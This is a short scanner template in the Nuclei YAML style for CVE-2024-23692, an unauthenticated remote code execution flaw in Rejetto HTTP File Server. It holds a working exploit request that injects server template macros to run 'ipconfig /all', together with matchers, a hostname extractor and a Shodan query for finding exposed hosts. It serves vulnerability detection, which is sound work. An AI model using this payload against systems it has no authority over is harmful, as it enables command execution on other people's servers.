id: CVE-2024-23692

info:
  name: Rejetto HTTP File Server - Template injection 
  author: johnk3r
  severity: high
  description: |
     This vulnerability allows a remote, unauthenticated attacker to execute arbitrary commands on the affected system by sending a specially crafted HTTP request.
  reference:
    - https://github.com/rapid7/metasploit-framework/pull/19240
    - https://mohemiv.com/all/rejetto-http-file-server-2-3m-unauthenticated-rce/
  metadata:
    verified: true
    max-request: 1
    shodan-query: product:"HttpFileServer httpd"
  tags: cve,cve2024,hfs,rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?n=%0A&cmd=ipconfig+/all&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}"

    matchers:
      - type: regex
        part: body
        regex:
          - "Windows IP Configuration"
          - "Host Name"

    extractors:
      - type: regex
        part: body
        regex:
          - "Host Name .+ : ([^\r\n]+)"
